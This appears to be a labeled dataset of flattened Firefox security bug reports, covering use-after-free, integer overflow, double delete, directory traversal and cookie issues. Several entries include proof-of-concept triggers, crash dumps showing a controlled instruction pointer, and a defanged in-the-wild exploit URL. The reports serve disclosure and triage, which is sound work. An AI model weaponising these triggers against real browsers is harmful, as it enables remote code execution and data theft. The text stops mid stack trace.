interleaving document.write and appendchild can lead to duplicate text frames and overrunning of text run buffers morten kråkvik of telenor soc reported an in-the-wild 0day affecting firefox 3.6.x on windows to security a compromised site is currently redirecting visitors to hxxp l-3com.dyndns-work.com/admissions/admin.php which contains exploits directed at firefox users on windows the exploit is confirmed successful on windows xp sp3 firefox 3.6.11	11
critical bug when calling document.write user-agent mozilla/5.0 windows u windows nt 5.1 de rv:1.9.2.12 gecko/20101026 firefox/3.6.12 net clr 3.5.30729 build identifier mozilla/5.0 windows u windows nt 5.1 de rv:1.9.2.12 gecko/20101026 firefox/3.6.12 net clr 3.5.30729 crashing after executing the following code from my test website with firefox 3.6.12 script language javascript var m 6 for var i 0 i 26 i m m m document.write m script reproducible always steps to reproduce 1 create a file called crash.htm with the following content script language javascript var m 6 for var i 0 i 26 i m m m document.write m script 2 doppelclick the file actual results 0034a874 7684fdff 04000000 00000005 03d6e948 usp10 doublewidecharmappedstring doublewidecharmappedstring 0034a954 76850f69 04000000 00000005 00000000 usp10 scripttokenize 0034a990 76846248 0034af78 04000000 0034aa54 usp10 scriptitemizecommon 0034a9b4 555dc1a2 0034af78 04000000 00000005 usp10 scriptitemize warning stack unwind information not available following frames may be wrong 0034aa6c 58348741 583e7ff8 00000000 0034ab28 xul gfxtextrun copyglyphdatafrom 00000000 00000000 00000000 00000000 00000000 mozcrt19 expand	11
firefox crash ycc_rgb_convert ycc_rgb_convert_argb on image with src set to a resource with multipart/x-mixed-replace content type access violation user-agent mozilla/5.0 windows u windows nt 6.1 fr rv:1.9.2.12 gecko/20101026 firefox/3.6.12 build identifier mozilla/5.0 windows u windows nt 6.1 fr rv:1.9.2.12 gecko/20101026 firefox/3.6.12 visiting a webpage that contains an image with the src-attribute that refers to a multipart/x-mixed-replace resource firefox 3.6.12 crashes after some time exactly the same as bug 524921 tested on windows 7 reproducible always steps to reproduce 1 visit test page 2 wait a few moments actual results firefox crashes expected results firefox do n't crash the crash is very intermittent sometimes firefox will crash after some seconds and sometimes firefox do n't crash at all	11
cookies set for www.foo.com are sent to www.foo.com firefox considers the domains www.foo.com host1 to be the same as www.foo.com host2 for cookie purposes note the trailing period in the first domain cookie values set by either host1/host2 can be retrieved by and sent to the other host tests showed that the hosts are considered different from crossdomain purposes ff4b7 3.6.11 and safari 5.0.2 all exhibited the same behavior while chrome did not see attached screenshots for demonstration steps used in screenshot 1 visit www.tumblr.com controlled by me sets a cookie 2 visit www.tumblr.com note that the cookie i set is sent to tumblr.com the tumblr issue is n't resolved yet it seems to me that the chrome way of handling hosts is more correct however the specs may say otherwise there may also be other areas of the code that exhibit similar behavior user agents ff4b7 mozilla/5.0 macintosh intel mac os x 10.6 rv:2.0b7 gecko/20100101 firefox/4.0b7 ff3.6.11 mozilla/5.0 x11 u linux i686 en-us rv:1.9.2.11 gecko/20101013 ubuntu/10.04 lucid firefox/3.6.11 safari 5.0.2 mozilla/5.0 macintosh u intel mac os x 10_6_5 en-us applewebkit/533.18.1 khtml like gecko version/5.0.2 safari/533.18.5 chrome 8.0.552.215 mozilla/5.0 macintosh u intel mac os x 10_6_5 en-us applewebkit/534.10 khtml like gecko chrome/8.0.552.215 safari/534.10	2
use after free in nsxulprotypescript when viewing xul document w/js disabled user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.2.12 gecko/20101027 fedora/3.6.12-1.fc14 firefox/3.6.12 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.9.2.12 gecko/20101027 fedora/3.6.12-1.fc14 firefox/3.6.12 under certain conditions when accessing a xul document in mozilla firefox it appears that some memory is freed which could potentially still be in use this results in a use after free vulnerability this issue is highly sensitive to installed add-ons which makes reliable exploitation rather difficult but it can be fairly reliably exploited utilizing the popular noscript add-on this could potentially also affect other products such as thunderbird crashing in xpcom code but i have not found a way to demonstrate this i am able to reproduce this in firefox rather easily by opening many xul documents when scripts are not allowed for the domain that they are hosted on then closing the browser it tends to result in either a hang at exit which is only easy to notice if running firefox from a terminal or result in a segmentation fault it appears not to have the problem with hanging when running firefox with gdb it will simply segfault i have tested this in both windows vista and linux fedora 14 reproducible sometimes steps to reproduce source of test.xul referred to in the steps to reproduce xml version 1.0 encoding utf-8 page xmlns script type application/javascript cdata var t 1 script page 1 install firefox 3.6.12 and the noscript add-on 2 run firefox attached to a debugger firefox g and open test.xul multiple times approximately 5 it could be placed on a web server but was not in this example 3 make sure that noscript has scripts disabled for the current domain this may not be necessary but was done during my tests 4 close firefox when running firefox without gdb it seems to hang at exit more often than it results in a segmentation fault 5 note that most of the time there will be a segmentation fault in free which seems to be caused by a double free in rare cases depending on other open pages and various other factors a function pointer will be overwritten when other memory is allocated with the address of the freed memory this will result in a jump to an arbitrary location in memory at exit in my tests usually actual results as mentioned it will either hang result in a segmentation fault in free or jump to an arbitrary address very rarely expected results firefox should properly terminate stack traces and test.xul will be attached	11
crash when opening a page with several marquee elements nsstyleset getcontext user-agent mozilla/5.0 x11 linux i686 on x86_64 rv:2.0b7 gecko/20100101 firefox/4.0b7 build identifier firefox 4.0b7 opening a specific html document consisting mainly of marquee elements causes current firefox 4.0b7 to crash with an invalid read of size 4 with a high address in libxul.so reproducible always steps to reproduce 1 echo foo marquee marquee marquee marquee marquee marquee foo marquee foo marquee foo object marquee foo marquee marquee foo foo marquee marquee foo marquee marquee marquee foo marquee foo foo marquee marquee marquee.html 2 3 firefox marquee.html actual results firefox crashes with a segfault expected results firefox remains running this looks like a potentially dangerous crash to me 4.0 stable release is probably not too far off and many people are already using 4.0 beta series so reporting this as a security issue to be on the safe side	11
integer overflow in frameset spec not bug 576447 w/gcc compiler user-agent mozilla/5.0 x11 u linux i686 en-gb rv:1.9.2.13 gecko/20101206 ubuntu/10.04 lucid firefox/3.6.13 build identifier 3.6.13 when creating a frameset element both a rows and cols spec are parsed by nshtmlframesetelement parserowcol which limits their sizes to 100'000 elements if a frameset spec is created where the product of the rows and cols sizes is 2^32 we overflow the print32 numcells layout/generic/nsframesetframe.cpp 352 print32 numcells mnumrows mnumcols 369 mchildframeborder new nsframeborder numcells with carefully crafted values for the rows and cols spec this can lead to arbitrary code execution on some platforms perl script to generate poc usr/bin/env perl spec1 x 61750 spec1 spec1 spec2 x 69552 spec2 spec2 print html print frameset rows spec1 cols spec2 frame src='example1.com frame src='example2.com frame src='example3.com frame src='example4.com frame src='example5.com frame src='example6.com frame src='example7.com frameset html this poc crashes reliably on my 32 bit linux box with the following stack trace program received signal sigsegv segmentation fault nshtmlframesetframe getnoresize this achildframe at nsframesetframe.cpp:1359 1359 nsicontent content achildframe getcontent gdb bt 0 nshtmlframesetframe getnoresize this achildframe at nsframesetframe.cpp:1359 1 in nshtmlframesetframe canchildresize this avertical=1 aleft=0 achildx=69553 aframeset=0 at nsframesetframe.cpp:1375 2 in nshtmlframesetframe setborderresize this achildtypes aborderframe at nsframesetframe.cpp:1452 3 in nshtmlframesetframe reflow this aprescontext adesiredsize areflowstate astatus at nsframesetframe.cpp:1258 4 in nsblockreflowcontext reflowblock this aspace value optimised out aapplytopmargin=1 aprevmargin aclearance=0 aisadjacentwithtop=1 aline aframers aframereflowstatus astate at nsblockreflowcontext.cpp:310 5 in nsblockframe reflowblockframe this astate aline akeepreflowgoing at nsblockframe.cpp:3141 6 in nsblockframe reflowline this astate aline akeepreflowgoing at nsblockframe.cpp:2408 7 in nsblockframe reflowdirtylines this astate at nsblockframe.cpp:1921 8 in nsblockframe reflow this aprescontext ametrics areflowstate astatus at nsblockframe.cpp:991 9 in nscontainerframe reflowchild this akidframe aprescontext adesiredsize areflowstate ax=0 ay=0 aflags value optimised out astatus atracker at nscontainerframe.cpp:800 10 in canvasframe reflow this aprescontext adesiredsize areflowstate astatus at nshtmlframe.cpp:549 11 in nscontainerframe reflowchild this akidframe aprescontext adesiredsize areflowstate ax=0 ay=0 aflags value optimised out astatus atracker at nscontainerframe.cpp:800 12 in viewportframe reflow this aprescontext adesiredsize areflowstate astatus at nsviewportframe.cpp:284 13 in presshell doreflow this target ainterruptible=1 at nspresshell.cpp:7296 14 in presshell processreflowcommands this ainterruptible=1 at nspresshell.cpp:7432 15 in presshell flushpendingnotifications this atype=flush_interruptiblelayout at nspresshell.cpp:4910 16 in presshell reflowevent run this at nspresshell.cpp:7106 17 in nsthread processnextevent this maywait=0 result at nsthread.cpp:527 18 in ns_processnextevent_p thread maywait=0 at nsthreadutils.cpp:250 19 in mozilla ipc messagepump run this adelegate at messagepump.cpp:110 20 in messageloop runinternal this at src/base/message_loop.cc:216 21 in messageloop runhandler this at src/base/message_loop.cc:199 22 in messageloop run this at src/base/message_loop.cc:173 23 in nsbaseappshell run this at nsbaseappshell.cpp:174 24 in nsappstartup run this at nsappstartup.cpp:183 25 in xre_main argc=1 argv aappdata at nsapprunner.cpp:3483 26 in main argc=1 argv at nsbrowserapp.cpp:158 analysis the poc creates a frameset with 61751 rows and 69553 cols which overflows to allocate memory for 7 frames nshtmlframesetframe init uses this 7 value throughout and i ca n't find any opportunity for a heap overflow there but nshtmlframesetframe setborderresize uses the mnumrows and mnumcols values to iterate through the cells print32 childx aborderframe mprevneighbor rowx mnumcols it passes the computed index to nshtmlframesetframe canchildresize which calls nsframelist frameat print32 aindex with the out of bounds index 276 nsframelist frameat print32 aindex const 277 278 ns_precondition aindex 0 invalid arg 279 if aindex 0 return nsnull 280 nsiframe frame mfirstchild 281 while aindex 0 frame 282 frame frame getnextsibling 283 284 return frame this will walk off the end of the list and return null this is then passed to nshtmlframesetframe getnoresize without checking for null getnoresize also performs no null check on the pointer it is passed before executing 1359 nsicontent content achildframe getcontent where achildframe is a null pointer if you can map the null page eg an older version of linux not sure about other systems you could heap spray hoping to control memory just above to gain control of execution flow there may be a more elegant heap overflow possible using the integer overflow but i have n't found one the fix would be to limit the size of frameset specs to something way below 100'000 and a null check on the return value of nsframelist frameat reproducible always steps to reproduce 1 run perl script to generate html file 2 open in browser actual results crash expected results not crash	11
use after free after appending a frame/iframe element to a dom tree with the noscript add-on enabled user-agent mozilla/5.0 x11 u linux x86_64 en-us rv:1.9.2.13 gecko/20101206 ubuntu/10.04 lucid firefox/3.6.13 build identifier mozilla firefox 3.6.13 after appending a frame with a src of to a title element with the noscript add-on enabled firefox will usually crash this is caused by a read of freed memory the crash is usually occurring in nsdocshellenumerator getnext nsisupports i have tested this in firefox 3.6.13 with noscript 2.0.9.3 on ubuntu 10.04 64 bit and windows vista 32 bit reproducible sometimes steps to reproduce 1 open the attached testcase 1.html in firefox with the noscript add-on enabled 2 if a crash does not occur immediately either refresh the page a few times or close the browser the crash after closing is extremely consistent but refreshing the page a few times seems to do the trick actual results the browser will either crash after loading the page or at exit expected results the particular script should be executed as expected and the browser should not crash the html file that produces the crash a stack trace using gdb and output from valgrind will be attached after this bug is created if i discover any other useful information about this bug i will include it	11
directory traversal in resource protocol user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.2.13 gecko/20101203 firefox/3.6.13 net clr 3.5.30729 net4.0e build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.2.13 gecko/20101203 firefox/3.6.13 net clr 3.5.30729 net4.0e by using a semi-colon character after the resource protocol we can bypass the protections and use in order to do directory traversal or use the colon character it can be used for file/directory enumeration or including important javascript files in a script tag for example for a windows box we can use script src resource directory\secret.js script or script src resource directory\secret.js data script or script src resource something.com directory index_allocation\secret.js script linux box might be exploitable by resource something.com as i have n't tried it in a linux box yet reproducible always steps to reproduce 1 in windows open the following url by using mozilla firefox resource 2 you can see the root directory actual results you can see the root directory expected results i should be limited and get access denied for example i just find this bug in 15 minutes and i am reporting this immediately to you after finding it therefore excuse me if i have any mistake in writing the report	9
regexp-statics possibly allows to read private data mozilla/5.0 windows u windows nt 6.0 ja rv:1.9.2.13 gecko/20101203 description when regexp.input is set jssubstring which regexp 1 uses becomes a dangling pointer so scripts can read a freed-and-recycled memory area testcase 1 open the new tab and execute javascript function s v return xxxxxxx xxxxxxx xxxx v exec s 0 regexp.input s 1 clearinterval window.tid window.tid setinterval function document.title regexp 1 1000 void 0 2 then browse some sites in other tabs	5
cert_decodecertpackage reads bytes outside the input buffer user-agent mozilla/5.0 x11 u linux x86_64 en-us applewebkit/534.13 khtml like gecko chrome/9.0.597.83 safari/534.13 build identifier 187 cert_decodecertpackage may read bytes outside of the input buffer first it reads certbuf 0 and certbuf 1 without checking certlen though it may be assuming the input is zero-terminated but even in that case it s incorrect for example at line 218 it reads certbuf 5 cp 4 but it only knows that bytes certbuf 0 and certbuf 1 are nonzero it never makes sure that certbuf 2 3 and 4 are nonzero this may result in the program crashing if the procedure and cert_decodecertfrompackage which calls it is supplied with a very small input reproducible always	5
mitigate clickjacking of about certerror a site colluding with a mitm attacker can show a fake about certerror page with the add exception button of a real about certerror page for another site showing through an iframe if the user judges the front site unimportant and fails to recheck the hostname in the add security exception dialog his/her communications with the back site are compromised i have linked a demo for firefox 3.6 and 4 that targets www.cacert.org so it will not work if you have the cacert root enabled or already have a cert override for this site the demo assumes browser.xul.error_pages.expert_bad_cert is enabled in a real attack i think one could avoid this assumption by supplying a cert with a related hostname so that the technical details section of the back page expands and then letting the entire i understand the risks section including the toggle show through the only problem is that the width of the errorpagecontainer may change when this section opens and i m not sure how to make it change on both the front and back pages please consider mitigating this attack one possibility when about certerror loads in a frame it could say in place of the button to add an exception you need to a open this page in a new tab a i m marking the bug private as a precaution please feel free to open it if you judge that it does not need this protection	11
lack of null check in oom allows arbitrary write user-agent mozilla/5.0 x11 u linux i686 en-gb rv:1.9.2.13 gecko/20101206 ubuntu/10.10 maverick firefox/3.6.13 build identifier 3.6.13 when parsing mime types for example the text/javascript here script type text/javascript the following code in netwerk/mime/src/nsmimeheaderparamimpl.cpp is called function nsmimeheaderparamimpl getparameterinternal 158 aparamname is empty return the first possibly unnamed parameter 159 for instance return inline in the following case 160 content-disposition inline filename 161 if aparamname aparamname 162 163 for str str nscrt isasciispace str str 164 165 if str start 166 return ns_error_unexpected 167 aresult char nsmemory clone start str start 1 168 aresult str start 0 null-terminate 169 ns_ensure_true aresult ns_error_out_of_memory 170 return ns_ok 171 if the clone call fails returning null then a null byte is still written to a controlled arbitrary address str start where str-start is the length of the mime type string the address which could be written to does depend on the size of the string which is required to fail the clone call but it s still useably arbitrary and importantly is an absolute address lack of a mapped null page in modern oses does n't stop this since is never dereferenced here but a controlled suitably large offset from it one possible exploitation scenario would be using this vuln to overwrite a refcount somewhere setting it to 0 allowing a use-after-free i do n't have a poc unfortunately i tried to knock up some suitable heap grooming js but i could n't get the right layout to trigger the clone failing that s not to say it s not possible the following html will hit the line of code though html head script type text/javascriptaaaaaaaaaaaa script head body x body html obviously you want a much longer run of aaa s reproducible could n't reproduce steps to reproduce exhaust memory suitably document.write a script tag with a long mime type	11
crash with bad iframe source user-agent mozilla/5.0 x11 linux i686 on x86_64 rv:2.0b11 gecko/20100101 firefox/4.0b11 build identifier 4.0b11 firefox 4.0b11 crashes in libxul with a segfault on a bad and possibly controllable read when given an iframe with source address 80 reproducible always steps to reproduce 1 echo iframe src 80 page.html 2 3 firefox page.html actual results firefox is sorry it followed a bad pointer expected results firefox should only follow good pointers the above minimal case crashes with program received signal sigsegv segmentation fault switching to thread lwp 31736 in from libxul.so mov edx eax,4 edi with eax 1 edx 0 different files causing this seem to have edx=0 but eax as different values like 256975184 which make this look less like a harmless null deref filing conservatively as a security issue	11
binary planting potential in thinkpadsensor startup mitja kolsek reported this today as a follow up to cve-2010-3131 our colleague noticed that one of the binary planting issues we reported to you last year during the binary planting sweep has n't been fixed yet or it has subsequently returned to the code i have attached our report so you do n't have to dig through the archives the test was done on firefox 3.6.15 soon-to-be-released firefox 4 mitigates this issue to some extent by calling setdlldirectory but due to a bug in windows this mitigation is not fully effective see we confirmed that a problematic path entry as described in this blog post makes ff4 again vulnerable to binary planting through sensor.dll a quick mxr search for sensor.dll turns up prbool thinkpadsensor startup mlibrary loadlibraryw l sensor.dll if mlibrary return pr_false gshockproofgetaccelerometerdata shockproofgetaccelerometerdata getprocaddress mlibrary shockproofgetaccelerometerdata if gshockproofgetaccelerometerdata freelibrary mlibrary mlibrary nsnull return pr_false return pr_true i m copying ehsan since he fixed a more recent version of one of these	2
document.cookie should only allow setting one cookie at a time currently document.cookie allows setting multiple cookies in a single call this is inconsistent with other browsers as well as our documentation note that you can only set/update a single cookie at a time using this method this can lead to security problems in web applications when an external script takes untrusted input e.g from a url parameter that input can contain line breaks and thus set multiple cookies to the including web site therefore we should disallow setting multiple cookies using document.cookie	9
crash if javascript code makes more than 100 unique cross domain requests user-agent mozilla/5.0 windows u windows nt 6.1 en-gb rv:1.9.2.16 gecko/20110319 firefox/3.6.16 build identifier mozilla/5.0 windows u windows nt 6.1 en-gb rv:1.9.2.16 gecko/20110319 firefox/3.6.16 we have a web page using jquery 1.5.1 that makes a post ajax request to a rest web service on another domain firefox sends a preflighting options request then the post if the server responds with a header of access-control-max-age set to a number of seconds longer than it takes to make 100 unique uri requests firefox crashes on the 101st unique url post request firefox makes the 101st options request to the server which replies then firefox crashes with the attached crash dump reproducible always steps to reproduce 1 edit crossdomaintest.html line 22 to point to a rest webservice 2 ensure the webservice response includes a header of access-control-max-age set to something like 1728000 which is 20 days 3 open the page in firefox 4 on the 101 request firefox crashes actual results firefox crashed and showed the submit crash dump dialog expected results firefox should continue to make requests this is related to the submitted crash dump id 7636c991-6b98-4abf-b2c4-7ea2c2110322 module xul.dll when no access-control-max-age header is defined in the web service response firefox continues to make more than 101 requests we are unsure if this bug could be exploited so we are setting the many users could be harmed option until further investigation confirms the extent of this issue	11
crash due to double-delete in nsdirindexparser user-agent mozilla/5.0 x11 u linux i686 en-gb rv:1.9.2.16 gecko/20110323 ubuntu/10.10 maverick firefox/3.6.16 build identifier 3.6.16 by passing a malformed application/http-index-format response it is possible to cause a double delete in nsdirindexparser leading to application crash and potential arbitrary code execution details all code below is from netwerk/streamconv/converters/nsdirindexparser.cpp the nsdirindexparser destructor deletes the member mformat 101 nsdirindexparser nsdirindexparser 102 delete mformat this is usually fine as mformat is either null as it is initalised in the init method or a value which has been return by new in the method parseformat line 206 178 nsdirindexparser parseformat const char aformatstr 179 parse a 200 format line and remember the fields and their 180 ordering in mformat multiple 200 lines stomp on each other 181 182 delete mformat 183 184 lets find out how many elements we have 185 easier to do this then realloc 186 const char pos aformatstr 187 unsigned int num 0 188 do 189 while pos nscrt isasciispace prunichar pos 190 pos 191 192 num 193 there are a maximum of six allowed header fields doubled plus 194 terminator just in case bug 443299 195 if num 2 ns_array_length gfieldtable 196 return ns_error_unexpected 197 198 if pos 199 break 200 201 while pos nscrt isasciispace prunichar pos 202 pos 203 204 while pos 205 206 mformat new int num+1 mformat is deleted on entry to this function on line 182 by passing a correct 200 line with num 14 mformat will be assigned the value returned by new on line 206 if another 200 line is encountered mformat will be deleted on 182 but not set to null if this second 200 line has an incorrect number of header fields it will fail the check on line 195 and an error value will be return with mformat retaining the value which was just deleted when this instance of nsdirindexparser is destroyed the destructor will be called deleting the same mformat which has already been deleted leading potentially to a crash or arbitrary code execution a simple patch would be to set mformat to null after it is deleted on line 182 this issue appears to have been introduced by the fix for bug 443299 which limited the number of header fields i ll attach a simple python script which will generate the required application/http-index-format response based on the poc for bug 443299 due to the nature of double delete bugs it may not crash every time and may crash with many different stack traces i am able to reliably crash firefox here sometimes having to mash f5 a bit sometimes not i ve only tested on ff 3.6.16 32 bit ubuntu 10.10 reproducible always steps to reproduce run attached python script navigate to localhost:8080 crash try with different tabs open etc to get different traces	11
appendchild dom tree inconsistency remote code execution vulnerability zdi-can-1141 zdi-can-1141 mozilla firefox appendchild dom tree inconsistency remote code execution vulnerability cvss 9 av n/ac l/au n/c p/i p/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw results when setuserdata handlers are used with an object and appendchild is called within a handler ultimately the import operation resulting from an appendchild is not guarded from mutation and invalid dom trees can result invalid dom trees can be navigated resulting in dereferencing invalid pointers which can be leveraged to execute arbitrary code in the context of the browser version s tested mozilla firefox 3.6.13 platform s tested windows xp sp3 dom method appendchild seems flawed due to the way adoptnode user data callback mechanism is implemented user can silently re-adopt node from within the handler hook is later re-executed which allows attacker to build inconsistent dom tree with a single node being set as a child of 2 parents at the same time child itself will be pointing back at one of its parents as the parent somehow like on the diagram below root parent1 parent2 child in other words javascript notation all assertions hold root.childnodes.length 2 root.childnodes 0 parent1 root.childnodes 1 parent2 root.parentnode null parent1.childnodes.length 1 parent1.childnodes 0 child parent1.parentnode root parent2.childnodes.length 1 parent2.childnodes 0 child parent2.parentnode root child.childnodes.length 0 child.parentnode parent2 this invalid dom tree can be exploited in numerous ways the poc illustrates one example using node iteration the example poc results in attacker control of eip 2e0.190 access violation code c0000005 second chance eax=0c0c0c0c ebx=04ad2460 ecx=04ad2460 edx=109d8c34 esi=01b6a954 edi=00000000 eip=0c0c0c0c esp=0012eba8 ebp=0012ebec iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 unloaded_ta.dll 0c0c0c0c 0c0c or al,0ch regarding filtering this vulnerability can be triggered via javascript with many potential representations in code and as a result may be difficult if not impossible to filter credit this vulnerability was discovered by regenrecht	9
mozilla firefox svgpathseglist.replaceitem remote code execution vulnerability zdi-can-1142 zdi-can-1142 mozilla firefox svgpathseglist.replaceitem remote code execution vulnerability cvss 9 av n/ac l/au n/c p/i p/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the code responsible for parsing svg path segment objects the function nssvgpathseglist replaceitem does not account for deletion of the segment object list within a user defined domattrmodified eventlistener code within nssvgpathseglist replaceitem references the segment list without verifying that it was not deleted in the aforementioned callback this can be abused to create a dangling reference which can be leveraged to execute arbitrary code within the context of the browser version s tested 3.6.13 platform s tested win xp sp3 from content/svg/content/src/nssvgpathseglist.cpp ns_imethodimp nssvgpathseglist replaceitem nsidomsvgpathseg newitem pruint32 index nsidomsvgpathseg retval insertelementat newitemseg index removefromcurrentlist static_cast nssvgpathseg msegments.objectat index+1 ns_addref retval newitem return ns_ok during execution of insertelementat domattrmodified event is dispatched user s provided event handler will be called during that callback it is possible to delete whole content of msegments e.g by calling method clear on pathseglist object as msegments is defined as nscomarray and method objectat does not do out-of-bound check of index argument previously objectat freed memory will be referenced credit this vulnerability was discovered by regenrecht	11
mozilla firefox svgtextelement.getcharnumatposition remote code execution vulnerability zdi-can-1143 zdi-can-1143 mozilla firefox svgtextelement.getcharnumatposition remote code execution vulnerability cvss 9 av n/ac l/au n/c p/i p/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the code responsible for parsing svg text containers the code within nssvgglyphframe getcharnumatposition does not account for user defined getter methods modifying or destroying the parent object an attacker can abuse this flaw to create a dangling pointer which is referenced during the traversal of the svg container hierarchy this can be leveraged to execute arbitrary code within the context of the browser version s tested 3.6.13 platform s tested win xp sp3 from content/svg/content/src/nssvgtextcontentelement.cpp ns_imethodimp nssvgtextcontentelement getcharnumatposition nsidomsvgpoint point print32 retval nssvgtextcontainerframe metrics gettextcontainerframe if metrics retval metrics getcharnumatposition point return ns_ok from layout/svg/base/src/nssvgtextcontainerframe.cpp nssvgtextcontainerframe getcharnumatposition nsidomsvgpoint point print32 index 1 print32 offset 0 nsisvgglyphfragmentnode node getfirstglyphfragmentchildnode while node pruint32 count node getnumberofchars if count 0 print32 charnum node getcharnumatposition point if charnum 0 index charnum offset offset count keep going multiple characters may match and we must return the last one node getnextglyphfragmentchildnode node return index and later we reach layout/svg/base/src/nssvgglyphframe.cpp nssvgglyphframe getcharnumatposition nsidomsvgpoint point float xpos ypos point getx xpos point gety ypos nsrefptr gfxcontext tmpctx maketmpctx characteriterator iter this pr_false note that point getx xpos will execute user provided implementation of x property getter as specified in interface nsidomsvgpoint at that moment we can remove our svgtextelement nodes and all the related frames will be deleted as well characteriterator characteriterator nssvgglyphframe asource prbool aforceglobaltransform msource asource mcurrentadvance 0 mcurrentchar 1 minerror pr_false if asource ensuretextrun mdrawscale mmetricsscale aforceglobaltransform asource getcharacterpositions mpositions mmetricsscale minerror pr_true nssvgglyphframe ensuretextrun float adrawscale float ametricsscale prbool aforceglobaltransform compute the size at which the text should render excluding the ctm const nsstylefont fontdata getstylefont and here we reach a dangling pointer credit this vulnerability was discovered by regenrecht	9
mozilla firefox nsxulcommanddispatcher remote code execution vulnerability zdi-can-1203 zdi-can-1203 mozilla firefox nsxulcommanddispatcher remote code execution vulnerability cvss 9 av n/ac l/au n/c p/i p/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within nsxulcommanddispatcher.cpp during a ns_xul_command_update event dispatch the user is able to force command dispatcher to remove all the updaters in the mupdaters chain including the one that is currently in use as a result the local variable updater becomes a stale pointer and updater mnext refers to memory previously freed successful exploitation can lead to code execution in the context of the browser version s tested 3.6.16 platform s tested windows xp sp3 dispatcher-use-after-free1.xul results in the following crash 700.4b0 access violation code c0000005 second chance eax=00000000 ebx=00000001 ecx=0012e7e4 edx=c1c2c3c8 esi=0012ec4c edi=0012ec4c eip=101a501e esp=0012e7dc ebp=c1c2c3c8 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 xul nsxulcommanddispatcher matches 101a501e 395d04 cmp dword ptr ebp+4 ebx ss:0023 c1c2c3cc 0:000 k childebp retaddr 0012e7ec 1008d44b xul nsxulcommanddispatcher matches content\xul\document\src\nsxulcommanddispatcher.cpp 462 0012e8fc 1027415b xul nsxulcommanddispatcher updatecommands content\xul\document\src\nsxulcommanddispatcher.cpp 412 0012e910 10118e9e xul ns_invokebyindex_p xpcom\reflect\xptcall\src\md\win32\xptcinvoke.cpp 103 0012eba8 10114cb3 xul xpcwrappednative callmethod js\src\xpconnect\src\xpcwrappednative.cpp 2722 0012ec74 0051790d xul xpc_wn_callmethod js\src\xpconnect\src\xpcwrappednativejsops.cpp 1740 0012ed28 0051c654 js3250 js_invoke js\src\jsinterp.cpp 1360 0012ef64 00517766 js3250 js_interpret js\src\jsops.cpp 2241 0012f008 0050c1f3 js3250 js_invoke js\src\jsinterp.cpp 1368 0012f038 004ef727 js3250 js_internalinvoke js\src\jsinterp.cpp 1423 0012f060 101870a8 js3250 js_callfunctionvalue js\src\jsapi.cpp 5115 0012f0dc 1018bef3 xul nsjscontext calleventhandler dom\base\nsjsenvironment.cpp 2198 0012f288 1008673f xul nsjseventlistener handleevent dom\src\events\nsjseventlistener.cpp 269 0012f378 1012b311 xul nseventlistenermanager handleeventsubtype content\events\src\nseventlistenermanager.cpp 1041 0012f3d8 1012ad41 xul nseventlistenermanager handleevent content\events\src\nseventlistenermanager.cpp 1147 0012f420 10117418 xul nseventtargetchainitem handleeventtargetchain content\events\src\nseventdispatcher.cpp 312 0012f4ac 10071f3a xul nseventdispatcher dispatch content\events\src\nseventdispatcher.cpp 577 0012f518 1008023c xul documentviewerimpl loadcomplete layout\base\nsdocumentviewer.cpp 1036 0012f708 10095402 xul nsdocshell endpageload docshell\base\nsdocshell.cpp 5722 0012f730 100da833 xul nsdocshell onstatechange docshell\base\nsdocshell.cpp 5587 0012f76c 100417d3 xul nsdocloader fireonstatechange uriloader\base\nsdocloader.cpp 1314 0012f780 10084015 xul nsdocloader dostopdocumentload uriloader\base\nsdocloader.cpp 937 0012f7b0 100aba6b xul nsdocloader docloaderisempty uriloader\base\nsdocloader.cpp 804 0012f7dc 10174d00 xul nsdocloader onstoprequest uriloader\base\nsdocloader.cpp 697 0012f810 101ad388 xul nsloadgroup removerequest netwerk\base\src\nsloadgroup.cpp 680 0012f830 101acc20 xul nsdocument dounblockonload content\base\src\nsdocument.cpp 7179 0012f838 101acc75 xul nsdocument unblockonload content\base\src\nsdocument.cpp 7120 0012f84c 10020f4d xul nsbindingmanager doprocessattachedqueue content\xbl\src\nsbindingmanager.cpp 996 0012f850 100f41d0 xul nsrunnablemethod nsbindingmanager void run obj-firefox\dist\include\nsthreadutils.h 283 0012f880 101a0552 xul nsthread processnextevent xpcom\threads\nsthread.cpp 533 0012f8a8 10230895 xul ns_processpendingevents_p obj-firefox\xpcom\build\nsthreadutils.cpp 200 0012f8b4 103f2535 xul nswindow dispatchpendingevents widget\src\windows\nswindow.cpp 3143 0012f9b8 100d00e5 xul nswindow processmessage 0012f9f4 7e368734 xul nswindow windowproc widget\src\windows\nswindow.cpp 3727 0012fa20 7e368816 user32 internalcallwinproc 0012fa88 7e3689cd user32 usercallwinproccheckwow 0012fae8 7e368a10 user32 dispatchmessageworker 0012faf8 100d23ae user32 dispatchmessagew 0012fb64 100d25c7 xul nsappshell processnextnativeevent widget\src\windows\nsappshell.cpp 179 0012fb84 100f4115 xul nsbaseappshell onprocessnextevent widget\src\xpwidgets\nsbaseappshell.cpp 299 0012fbc0 1015f939 xul nsthread processnextevent xpcom\threads\nsthread.cpp 510 0012fc00 1022a073 xul mozilla ipc messagepump run ipc\glue\messagepump.cpp 110 0012fc3c 1022a03b xul messageloop runhandler ipc\chromium\src\base\message_loop.cc 200 0012fc74 